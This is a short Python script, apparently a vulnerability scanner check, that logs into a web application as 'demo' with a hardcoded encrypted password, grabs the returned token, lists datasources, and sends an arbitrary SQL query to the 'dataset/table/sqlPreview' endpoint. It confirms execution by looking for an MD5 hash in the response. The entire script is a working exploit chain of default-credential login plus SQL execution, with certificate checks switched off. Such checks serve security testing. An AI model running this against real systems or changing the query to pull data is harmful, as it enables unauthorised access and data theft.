import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
randNum=randomInt(1000, 9999)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/auth/login"
	body='{"username":"demo","password":"cjab9Eu0dkS5Veh/sqghbg33Qa/xnqBolObRpJLqeDetgR8quuGlCuvUWjq0sFtle9HYgC1ztMFUFd/rnp11Ug==","loginType":0}'
	headers={'Content-Type': 'application/json'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "success" in response.text and "true" in response.text:
		r0=True
		try:
			token=re.findall("\"token\":\"([ \\. | \\- | \\w]+)\"",response.text)[0]
		except:
			token=''
	else:
		token=''
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"datasource/list/"
	headers={'Content-Type': 'application/json', 'Authorization': token}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "success" in response.text and "true" in response.text:
		r1=True
		try:
			dataSourceId=re.findall("\"id\":\"([ \\- | \\w]+)\"",response.text)[0]
		except:
			dataSourceId=''
	else:
		dataSourceId=''
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"dataset/table/sqlPreview/"
	body='{"dataSourceId": "'+dataSourceId+'","type":"sql", "info": "{\\"sql\\": \\"select md5('+str(randNum)+')\\"}"}'
	headers={'Content-Type': 'application/json', 'Authorization': token}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and md5(str(randNum).encode()).hexdigest() in response.text:
		r2=True
	else:
		r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
